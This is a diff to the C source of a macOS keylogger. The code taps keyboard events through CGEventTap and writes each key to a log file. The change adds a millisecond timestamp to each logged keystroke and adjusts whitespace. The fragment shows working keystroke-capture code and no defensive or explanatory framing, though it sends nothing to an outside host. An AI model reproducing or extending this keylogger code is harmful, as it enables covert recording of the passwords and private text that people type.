@@ -26,7 +26,7 @@ int main(int argc, const char *argv[]) {
             logfileLocation = argv[1];
         }
     }
-    
+
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
 
@@ -49,9 +49,14 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    struct timeval  now;
+    struct tm*      local;
+
+    gettimeofday(&now, NULL);
+    local = localtime(&now.tv_sec);
 
     // This prints the readable key into the log
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%02d:%02d:%02d.%03d    %s\n", local->tm_hour, local->tm_min, local->tm_sec, now.tv_usec / 1000, convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
